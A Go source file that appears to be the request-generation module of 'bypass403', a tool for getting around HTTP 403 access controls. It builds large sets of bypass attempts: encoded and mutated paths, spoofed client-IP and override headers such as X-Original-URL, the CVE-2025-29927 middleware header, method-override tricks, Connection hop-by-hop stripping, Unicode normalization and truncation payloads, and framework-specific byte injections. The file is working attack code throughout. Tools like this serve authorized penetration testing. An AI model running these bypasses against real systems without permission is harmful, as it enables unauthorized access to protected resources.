// Package modules builds the full set of bypass403 request candidates from
// the loaded payload database. Every function returns []worker.Request and is
// wired into Build(). Module responsibilities:
//
//	pathMutations      – end-path, mid-path, and raw-encoding strategies from paths.json
//	headerInjections   – IP headers × values, override headers, port headers (headers.json)
//	staticHeaders      – single-shot header injections (CVE-2025-29927, blank Host, Accept…)
//	methodFuzzing      – HTTP method sweep + override headers
//	hopByHop           – Connection: header stripping trick
//	protocolTricks     – scheme swap, Referer spoofing
//	userAgentFuzzing   – crawler/tool UA sweep (headers.json user_agents)
//	debugParams        – query-string debug param injection (headers.json debug_params)
//	apiVersionFuzzing  – /vN/ segment replacement
//	unicodeMutations   – Unicode normalization + truncation bypass (unicode.json)
//	byteQuirkMutations – framework-specific byte injection (bytequirks.json)
//	waybackPaths       – Wayback Machine CDX live lookup
package modules

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"time"
	"unicode/utf8"

	"bypass403/internal/worker"
	payloads "bypass403/payloads"
)

// Build generates all bypass request candidates for rawURL.
// db must be a fully loaded *payloads.DB (never nil).
func Build(rawURL string, wayback bool, silent bool, db *payloads.DB) []worker.Request {
	var reqs []worker.Request
	reqs = append(reqs, pathMutations(rawURL, db)...)
	reqs = append(reqs, headerInjections(rawURL, db)...)
	reqs = append(reqs, staticHeaders(rawURL, db)...)
	reqs = append(reqs, portHeaders(rawURL, db)...)
	reqs = append(reqs, methodFuzzing(rawURL)...)
	reqs = append(reqs, hopByHop(rawURL)...)
	reqs = append(reqs, protocolTricks(rawURL)...)
	reqs = append(reqs, userAgentFuzzing(rawURL, db)...)
	reqs = append(reqs, debugParams(rawURL, db)...)
	reqs = append(reqs, apiVersionFuzzing(rawURL)...)
	reqs = append(reqs, unicodeMutations(rawURL, db)...)
	reqs = append(reqs, byteQuirkMutations(rawURL, db)...)
	if wayback {
		reqs = append(reqs, waybackPaths(rawURL, silent)...)
	}
	return reqs
}

// ── helpers ──────────────────────────────────────────────────────────────────

func parseBase(rawURL string) (u *url.URL, base, path string, ok bool) {
	var err error
	u, err = url.Parse(rawURL)
	if err != nil {
		return nil, "", "", false
	}
	base = strings.TrimRight(u.Scheme+"://"+u.Host, "/")
	path = u.Path
	return u, base, path, true
}

// rawReq builds a Request that must travel over the raw socket client so its
// path is never touched by Go's URL normalization.
func rawReq(method, baseURL, rawTarget, desc, module string, hdrs map[string]string) worker.Request {
	if hdrs == nil {
		hdrs = map[string]string{}
	}
	return worker.Request{
		Method:      method,
		URL:         baseURL, // used for display/dedup only; wire target is RawTarget
		Headers:     hdrs,
		Description: desc,
		Module:      module,
		UseRaw:      true,
		RawTarget:   rawTarget,
	}
}

// stdReq builds a Request that goes through the stdlib net/http client.
func stdReq(method, fullURL, desc, module string, hdrs map[string]string) worker.Request {
	if hdrs == nil {
		hdrs = map[string]string{}
	}
	return worker.Request{
		Method:      method,
		URL:         fullURL,
		Headers:     hdrs,
		Description: desc,
		Module:      module,
	}
}

func stdReqWithValue(method, fullURL, desc, module string, hdrs map[string]string, value string) worker.Request {
	req := stdReq(method, fullURL, desc, module, hdrs)
	req.Value = value
	return req
}

// percentEncodeAll percent-encodes every byte of s, depth times.
func percentEncodeAll(s string, depth int) string {
	result := s
	for i := 0; i < depth; i++ {
		var sb strings.Builder
		for j := 0; j < len(result); j++ {
			fmt.Fprintf(&sb, "%%%02X", result[j])
		}
		result = sb.String()
	}
	return result
}

// percentEncodeChar percent-encodes a single byte, depth times.
func percentEncodeChar(b byte, depth int) string {
	s := fmt.Sprintf("%%%02X", b)
	for i := 1; i < depth; i++ {
		var sb strings.Builder
		for j := 0; j < len(s); j++ {
			fmt.Fprintf(&sb, "%%%02X", s[j])
		}
		s = sb.String()
	}
	return s
}

// ── pathMutations ─────────────────────────────────────────────────────────────

// pathMutations emits end-path, mid-path, and raw-encoding strategy payloads
// from paths.json. Entries with requires_raw=true are sent via the raw socket
// client so their byte sequences reach the wire unmodified.
//
// BUG FIX: the original code built all path variants as stdReq (UseRaw=false),
// meaning every encoding-based payload (%2e, %252e, ..;/, etc.) was silently
// normalized by Go's URL parser before leaving the host. They are now split
// correctly: requires_raw=true → rawReq, otherwise → stdReq.
func pathMutations(rawURL string, db *payloads.DB) []worker.Request {
	u, base, path, ok := parseBase(rawURL)
	if !ok {
		return nil
	}
	noSlash := strings.TrimPrefix(path, "/")

	// First-char uppercased
	capPath := path
	if len(path) > 1 {
		r, size := utf8.DecodeRuneInString(path[1:]) // skip leading /
		_ = r
		capPath = "/" + strings.ToUpper(string(path[1:1+size])) + path[1+size:]
	}

	// First internal slash doubled / encoded
	firstSlashDoubled := path
	firstSlashEncoded := path
	if idx := strings.Index(noSlash, "/"); idx >= 0 {
		abs := idx + 1 // offset into path (past leading /)
		firstSlashDoubled = path[:abs] + "/" + path[abs:]
		firstSlashEncoded = path[:abs] + "%2F" + path[abs+1:]
	}

	type entry struct {
		raw    string // raw request-line target
		value  string // original payload value/template
		desc   string
		useRaw bool
	}

	var entries []entry

	// --- end_paths from DB ---
	for _, ep := range db.Paths.EndPaths {
		val := strings.ReplaceAll(ep.Value, "{{PATH}}", path)
		entries = append(entries, entry{val, ep.Value, "Path[ep]: " + ep.Desc, ep.RequiresRaw})
	}

	// --- mid_paths from DB ---
	for _, mp := range db.Paths.MidPaths {
		val := mp.Value
		val = strings.ReplaceAll(val, "{{PATH}}", path)
		val = strings.ReplaceAll(val, "{{PATH_NOSLASH}}", noSlash)
		val = strings.ReplaceAll(val, "{{PATH_CAP}}", capPath)
		val = strings.ReplaceAll(val, "{{PATH_UPPER}}", strings.ToUpper(noSlash))
		val = strings.ReplaceAll(val, "{{PATH_URLESCAPED}}", url.PathEscape(noSlash))
		val = strings.ReplaceAll(val, "{{PATH_FIRSTSLASH_DBL}}", firstSlashDoubled)
		val = strings.ReplaceAll(val, "{{PATH_FIRSTSLASH_ENC}}", firstSlashEncoded)
		entries = append(entries, entry{val, mp.Value, "Path[mp]: " + mp.Desc, mp.RequiresRaw})
	}

	// --- raw_encoding_strategies from DB ---
	// Last path segment (e.g. "admin" from "/api/v1/admin")
	segments := strings.Split(strings.TrimPrefix(path, "/"), "/")
	lastSeg := segments[len(segments)-1]
	prefixPath := "/" + strings.Join(segments[:len(segments)-1], "/")
	if prefixPath == "/" {
		prefixPath = ""
	}

	for _, rs := range db.Paths.RawEncoding {
		depth := rs.Depth
		if depth == 0 {
			depth = 1
		}
		var variants []entry
		// Use HasPrefix so the depth-suffixed IDs (enc-last-char-d2, etc.) route
		// to the same logic branch as their depth-1 counterparts. Depth is driven
		// entirely by rs.Depth, not by the ID suffix.
		switch {
		case strings.HasPrefix(rs.ID, "enc-last-char"):
			if len(lastSeg) > 0 {
				encoded := lastSeg[:len(lastSeg)-1] + percentEncodeChar(lastSeg[len(lastSeg)-1], depth)
				variants = append(variants, entry{prefixPath + "/" + encoded, rs.Value, "RawEnc[" + rs.ID + "]: " + rs.Desc, true})
			}
		case strings.HasPrefix(rs.ID, "enc-first-char"):
			if len(lastSeg) > 0 {
				encoded := percentEncodeChar(lastSeg[0], depth) + lastSeg[1:]
				variants = append(variants, entry{prefixPath + "/" + encoded, rs.Value, "RawEnc[" + rs.ID + "]: " + rs.Desc, true})
			}
		case strings.HasPrefix(rs.ID, "enc-last-segment"):
			encoded := percentEncodeAll(lastSeg, depth)
			variants = append(variants, entry{prefixPath + "/" + encoded, rs.Value, "RawEnc[" + rs.ID + "]: " + rs.Desc, true})
		case strings.HasPrefix(rs.ID, "enc-full-path"):
			encoded := percentEncodeAll(strings.TrimPrefix(path, "/"), depth)
			variants = append(variants, entry{"/" + encoded, rs.Value, "RawEnc[" + rs.ID + "]: " + rs.Desc, true})
		case strings.HasPrefix(rs.ID, "enc-full-segment"):
			// Guard root path: segments == [""] produces a lone "/" — skip it.
			if len(segments) == 1 && segments[0] == "" {
				break
			}
			var encSegs []string
			for _, seg := range segments {
				encSegs = append(encSegs, percentEncodeAll(seg, depth))
			}
			encoded := "/" + strings.Join(encSegs, "/")
			variants = append(variants, entry{encoded, rs.Value, "RawEnc[" + rs.ID + "]: " + rs.Desc, true})
		}
		entries = append(entries, variants...)
	}

	// Deduplicate against the original path and against each other.
	seen := map[string]bool{path: true}
	var reqs []worker.Request
	for _, e := range entries {
		if seen[e.raw] {
			continue
		}
		seen[e.raw] = true
		if e.useRaw {
			reqs = append(reqs, rawReq("GET", base+e.raw, e.raw, e.desc, "path", nil))
		} else {
			reqs = append(reqs, stdReqWithValue("GET", base+e.raw, e.desc, "path", nil, e.value))
		}
	}

	// Also keep the original inline set from the prior implementation so
	// nothing regresses — these are all non-raw safe transformations.
	inline := []string{
		path + "??",
		path + ".json",
		path + ".html",
		path + ";index.html",
		path + "/*",
		"//" + noSlash,
		"///" + noSlash + "///",
		"/~" + noSlash,
		"/" + strings.ToUpper(noSlash),
		strings.Replace(path, "/", "//", 1),
	}
	for _, p := range inline {
		if seen[p] || p == path {
			continue
		}
		seen[p] = true
		reqs = append(reqs, stdReqWithValue("GET", base+p, "Path: "+p, "path", nil, p))
	}

	// Append u to silence "declared but not used" — we need u.Scheme above
	// via base, which is already computed from u.
	_ = u
	return reqs
}

// ── headerInjections ─────────────────────────────────────────────────────────

// headerInjections emits the full IP-header × IP-value matrix from headers.json
// plus override headers. Previously this used a shorter inline list (missing
// X-Client-IP, X-Host, X-Forwarded, [::1], 0.0.0.0, 127.1, etc.).
func headerInjections(rawURL string, db *payloads.DB) []worker.Request {
	u, _, _, ok := parseBase(rawURL)
	if !ok {
		return nil
	}
	path := u.Path
	baseRoot := strings.TrimRight(u.Scheme+"://"+u.Host, "/") + "/"

	var reqs []worker.Request

	// Full matrix from DB (was truncated in original)
	for _, h := range db.Headers.IPHeaders {
		for _, v := range db.Headers.IPValues {
			reqs = append(reqs, stdReq("GET", rawURL,
				fmt.Sprintf("Header: %s: %s", h, v), "headers",
				map[string]string{h: v}))
		}
	}

	// Override headers (X-Original-URL, X-Rewrite-URL, etc.)
	for _, oh := range db.Headers.OverrideHeaders {
		val := oh.Value
		if oh.ValueIsPath {
			val = path
		}
		reqs = append(reqs, stdReq("GET", baseRoot,
			fmt.Sprintf("Override: %s: %s", oh.Name, val), "headers",
			map[string]string{oh.Name: val}))
	}

	return reqs
}

// ── staticHeaders ─────────────────────────────────────────────────────────────

// staticHeaders fires every single-shot header from headers.json static_headers.
// This is a new module — previously these entries existed only in the JSON
// but were never sent. Covers: CVE-2025-29927 (x-middleware-subrequest),
// blank Host, Accept: application/json, Content-Type tricks, TE: chunked, etc.
func staticHeaders(rawURL string, db *payloads.DB) []worker.Request {
	var reqs []worker.Request
	for _, sh := range db.Headers.StaticHeaders {
		label := sh.Desc
		if sh.Source != "" {
			label = sh.Source + ": " + sh.Desc
		}
		reqs = append(reqs, stdReq("GET", rawURL, "Static: "+label, "static-header",
			map[string]string{sh.Name: sh.Value}))
	}
	return reqs
}

// ── portHeaders ───────────────────────────────────────────────────────────────

// portHeaders emits port_headers × port_values from headers.json.
// This module was completely absent in the original implementation.
func portHeaders(rawURL string, db *payloads.DB) []worker.Request {
	var reqs []worker.Request
	for _, h := range db.Headers.PortHeaders {
		for _, v := range db.Headers.PortValues {
			reqs = append(reqs, stdReq("GET", rawURL,
				fmt.Sprintf("PortHeader: %s: %s", h, v), "port-header",
				map[string]string{h: v}))
		}
	}
	return reqs
}

// ── methodFuzzing ─────────────────────────────────────────────────────────────

func methodFuzzing(rawURL string) []worker.Request {
	methods := []string{
		"HEAD", "POST", "PUT", "DELETE", "PATCH",
		"OPTIONS", "TRACE", "CONNECT", "FOO", "HACK",
		"INVENTED", "RANDOM",
	}
	overrideMethods := []string{"GET", "POST", "PUT", "DELETE", "PATCH"}
	overrideHeaderNames := []string{
		"X-HTTP-Method-Override",
		"X-Method-Override",
		"X-HTTP-Method",
		"_method",
	}

	var reqs []worker.Request

	for _, m := range methods {
		reqs = append(reqs, stdReq(m, rawURL, "Method: "+m, "method", nil))
	}

	// Content-Length: 0 trick: some middleware only checks method+body presence.
	// Sending POST/PUT/PATCH with an explicit zero body can slip past ACLs that
	// only block non-empty request bodies for those methods.
	for _, m := range []string{"POST", "PUT", "PATCH"} {
		reqs = append(reqs, stdReq(m, rawURL,
			"Method+CL0: "+m+" Content-Length: 0", "method",
			map[string]string{"Content-Length": "0"}))
	}

	for _, m := range overrideMethods {
		for _, hName := range overrideHeaderNames {
			reqs = append(reqs, stdReq("GET", rawURL,
				fmt.Sprintf("MethodOverride: %s: %s", hName, m), "method",
				map[string]string{hName: m}))
		}
	}

	return reqs
}

// ── hopByHop ─────────────────────────────────────────────────────────────────

func hopByHop(rawURL string) []worker.Request {
	combos := [][]string{
		{"X-Forwarded-For"},
		{"X-Real-IP", "X-Forwarded-For"},
		{"Authorization"},
		{"Proxy-Authorization"},
		{"Keep-Alive"},
		{"X-Forwarded-For", "X-Real-IP", "Authorization"},
		{"X-Forwarded-For", "Proxy-Authorization"},
		{"Authorization", "Proxy-Authorization", "Keep-Alive"},
	}
	var reqs []worker.Request
	for _, combo := range combos {
		val := strings.Join(combo, ", ")
		reqs = append(reqs, stdReq("GET", rawURL,
			"HopByHop: Connection: "+val, "hop-by-hop",
			map[string]string{"Connection": val}))
	}
	return reqs
}

// ── protocolTricks ────────────────────────────────────────────────────────────

func protocolTricks(rawURL string) []worker.Request {
	u, _, _, ok := parseBase(rawURL)
	if !ok {
		return nil
	}
	var altScheme string
	if u.Scheme == "https" {
		altScheme = "http"
	} else {
		altScheme = "https"
	}
	altURL := altScheme + "://" + u.Host + u.RequestURI()

	reqs := []worker.Request{
		stdReq("GET", altURL, "ProtoSwap: "+altURL, "protocol", nil),
		stdReq("GET", rawURL, "Referer: self", "protocol",
			map[string]string{"Referer": rawURL}),
		stdReq("GET", rawURL, "Referer: google.com", "protocol",
			map[string]string{"Referer": "https://google.com"}),
		stdReq("GET", rawURL, "Referer: internal", "protocol",
			map[string]string{"Referer": "http://localhost/"}),
	}
	return reqs
}

// ── userAgentFuzzing ──────────────────────────────────────────────────────────

// userAgentFuzzing now reads from headers.json user_agents instead of an
// inline list so additions to the JSON are picked up automatically.
func userAgentFuzzing(rawURL string, db *payloads.DB) []worker.Request {
	var reqs []worker.Request
	for _, ua := range db.Headers.UserAgents {
		reqs = append(reqs, stdReq("GET", rawURL, "UA: "+ua, "useragent",
			map[string]string{"User-Agent": ua}))
	}
	return reqs
}

// ── debugParams ───────────────────────────────────────────────────────────────

// debugParams now reads from headers.json debug_params.
func debugParams(rawURL string, db *payloads.DB) []worker.Request {
	sep := "?"
	if strings.Contains(rawURL, "?") {
		sep = "&"
	}
	var reqs []worker.Request
	for _, p := range db.Headers.DebugParams {
		reqs = append(reqs, stdReq("GET", rawURL+sep+p, "DebugParam: ?"+p, "debugparam", nil))
	}
	return reqs
}

// ── apiVersionFuzzing ─────────────────────────────────────────────────────────

func apiVersionFuzzing(rawURL string) []worker.Request {
	u, base, path, ok := parseBase(rawURL)
	if !ok {
		return nil
	}
	_ = u

	versions := []string{"v0", "v1", "v2", "v3", "v4", "api/v1", "api/v2", "api/v3"}
	seen := map[string]bool{path: true}
	var reqs []worker.Request

	// isVersionSeg returns true only for bare version segments like "v1", "v2", "v10".
	// Avoids false matches on segments like "invoke", "overview", "verbose".
	isVersionSeg := func(seg string) bool {
		if len(seg) < 2 || seg[0] != 'v' {
			return false
		}
		for _, c := range seg[1:] {
			if c < '0' || c > '9' {
				return false
			}
		}
		return true
	}

	for _, ver := range versions {
		var newPath string
		parts := strings.Split(path, "/")
		replaced := false
		for i, seg := range parts {
			if isVersionSeg(seg) {
				parts[i] = ver
				replaced = true
				break
			}
		}
		if replaced {
			newPath = strings.Join(parts, "/")
		} else {
			// No version segment found — prepend version prefix.
			newPath = "/" + ver + "/" + strings.TrimPrefix(path, "/")
		}
		if seen[newPath] {
			continue
		}
		seen[newPath] = true
		reqs = append(reqs, stdReq("GET", base+newPath, "APIVer: "+newPath, "apiversion", nil))
	}
	return reqs
}

// ── unicodeMutations ─────────────────────────────────────────────────────────

// unicodeMutations generates Unicode normalization and high-byte truncation
// bypass payloads from unicode.json. This module was completely missing from
// the original implementation.
//
// Two techniques:
//  1. Normalization: replace ASCII chars in sensitive path segments with
//     Unicode look-alikes (e.g. ／ U+FF0F for /) that the WAF doesn't match
//     but the app normalizes (NFKC) back to the ASCII value.
//  2. Truncation: replace a target ASCII char with a two-byte Unicode char
//     whose low byte equals the ASCII value (char & 0xFF == target), tricking
//     naive charset converters (ISO-8859-1 cast) into collapsing it.
//
// All Unicode payloads are sent via the raw client so the multi-byte sequences
// reach the wire unmodified.
func unicodeMutations(rawURL string, db *payloads.DB) []worker.Request {
	u, base, path, ok := parseBase(rawURL)
	if !ok {
		return nil
	}
	_ = u

	var reqs []worker.Request
	seen := map[string]bool{path: true}

	emit := func(raw, desc string) {
		if seen[raw] {
			return
		}
		seen[raw] = true
		reqs = append(reqs, rawReq("GET", base+raw, raw, desc, "unicode", nil))
	}

	// Build a replacement map: ascii char → unicode substitute.
	normMap := map[string]string{}
	for _, np := range db.Unicode.NormalizePairs {
		normMap[np.ASCII] = np.Unicode
	}

	truncMap := map[string]string{}
	for _, tc := range db.Unicode.TruncateChars {
		truncMap[tc.TargetASCII] = tc.Byte
	}

	// Apply normalization substitutions to the whole path.
	if len(normMap) > 0 {
		normPath := path
		for ascii, uni := range normMap {
			normPath = strings.ReplaceAll(normPath, ascii, uni)
		}
		if normPath != path {
			emit(normPath, "Unicode[normalize]: fullwidth substitution of path")
		}

		// Also apply only to the last segment.
		segs := strings.Split(path, "/")
		if len(segs) > 0 {
			lastSeg := segs[len(segs)-1]
			normSeg := lastSeg
			for ascii, uni := range normMap {
				normSeg = strings.ReplaceAll(normSeg, ascii, uni)
			}
			if normSeg != lastSeg {
				segs[len(segs)-1] = normSeg
				emit(strings.Join(segs, "/"), "Unicode[normalize-last-seg]: fullwidth last segment")
			}
		}
	}

	// Apply truncation substitutions.
	if len(truncMap) > 0 {
		truncPath := path
		for ascii, b := range truncMap {
			truncPath = strings.ReplaceAll(truncPath, ascii, b)
		}
		if truncPath != path {
			emit(truncPath, "Unicode[truncate]: high-byte strip → ASCII")
		}
	}

	// Apply to known sensitive segments as an additional targeted sweep.
	for _, seg := range db.Unicode.ApplyToSegments {
		if !strings.Contains(path, seg) {
			continue
		}
		// Normalize the segment itself
		normSeg := seg
		for ascii, uni := range normMap {
			normSeg = strings.ReplaceAll(normSeg, ascii, uni)
		}
		if normSeg != seg {
			p := strings.ReplaceAll(path, seg, normSeg)
			emit(p, "Unicode[seg-normalize]: fullwidth '"+seg+"'")
		}
		// Truncate the slash that precedes the segment
		if len(truncMap) > 0 {
			for ascii, b := range truncMap {
				if ascii == "/" {
					p := strings.ReplaceAll(path, "/"+seg, b+seg)
					emit(p, "Unicode[seg-truncate]: high-byte slash before '"+seg+"'")
				}
			}
		}
	}

	return reqs
}

// ── byteQuirkMutations ───────────────────────────────────────────────────────

// byteQuirkMutations generates framework-specific byte injection payloads from
// bytequirks.json. This module was completely missing from the original.
//
// For each framework (Flask, Spring, Node.js, generic-control), each byte is
// either prepended to the path ("prefix") or inserted as its own path segment
// ("segment"), in both raw and percent-encoded forms.
func byteQuirkMutations(rawURL string, db *payloads.DB) []worker.Request {
	u, base, path, ok := parseBase(rawURL)
	if !ok {
		return nil
	}
	_ = u

	var reqs []worker.Request
	seen := map[string]bool{path: true}

	emit := func(raw, desc string) {
		if seen[raw] {
			return
		}
		seen[raw] = true
		reqs = append(reqs, rawReq("GET", base+raw, raw, desc, "bytequirk", nil))
	}

	for _, fw := range db.ByteQuirks.Frameworks {
		for _, hexStr := range fw.Bytes {
			// Parse the hex value (e.g. "0x85" → 0x85)
			hexStr = strings.TrimPrefix(hexStr, "0x")
			byteVal, err := strconv.ParseUint(hexStr, 16, 8)
			if err != nil {
				continue
			}
			b := byte(byteVal)
			rawByte := string([]byte{b})
			pctByte := fmt.Sprintf("%%%02X", b)

			for _, pos := range fw.Positions {
				// Determine which encode forms to apply
				encodeForms := db.ByteQuirks.EncodeForms
				if len(encodeForms) == 0 {
					encodeForms = []string{"raw", "percent"}
				}
				for _, form := range encodeForms {
					var byteStr string
					switch form {
					case "raw":
						byteStr = rawByte
					case "percent":
						byteStr = pctByte
					default:
						byteStr = pctByte
					}

					label := fmt.Sprintf("ByteQuirk[%s 0x%02X %s %s]", fw.Name, b, pos, form)
					switch pos {
					case "prefix":
						emit(byteStr+path, label+": prefix before path")
					case "segment":
						// Insert the byte as a synthetic path segment before the last segment
						segs := strings.Split(strings.TrimPrefix(path, "/"), "/")
						if len(segs) > 1 {
							newSegs := append(segs[:len(segs)-1:len(segs)-1], byteStr, segs[len(segs)-1])
							emit("/"+strings.Join(newSegs, "/"), label+": injected segment")
						} else {
							emit("/"+byteStr+"/"+strings.TrimPrefix(path, "/"), label+": injected prefix segment")
						}
					}
				}
			}
		}
	}

	return reqs
}

// ── waybackPaths ─────────────────────────────────────────────────────────────

func waybackPaths(rawURL string, silent bool) []worker.Request {
	u, err := url.Parse(rawURL)
	if err != nil {
		return nil
	}
	host := u.Host

	cdxURL := fmt.Sprintf(
		"https://web.archive.org/cdx/search/cdx?url=%s/*&output=json&fl=original&collapse=urlkey&filter=statuscode:200&limit=100",
		host,
	)

	if !silent {
		fmt.Println("[*] Querying Wayback Machine CDX...")
	}
	client := &http.Client{Timeout: 20 * time.Second}
	resp, err := client.Get(cdxURL)
	if err != nil {
		if !silent {
			fmt.Printf("[!] Wayback error: %v\n", err)
		}
		return nil
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	var rows [][]string
	if err := json.Unmarshal(body, &rows); err != nil {
		if !silent {
			fmt.Printf("[!] Wayback parse error: %v\n", err)
		}
		return nil
	}

	seen := map[string]bool{}
	var reqs []worker.Request
	for _, row := range rows {
		if len(row) == 0 {
			continue
		}
		pu, err := url.Parse(row[0])
		if err != nil {
			continue
		}
		p := pu.Path
		if seen[p] || p == "/" || p == "" {
			continue
		}
		seen[p] = true
		reqs = append(reqs, stdReq("GET",
			u.Scheme+"://"+u.Host+p,
			"Wayback: "+p, "wayback", nil))
	}
	if !silent {
		fmt.Printf("[*] Wayback: %d unique paths queued\n\n", len(reqs))
	}
	return reqs
}
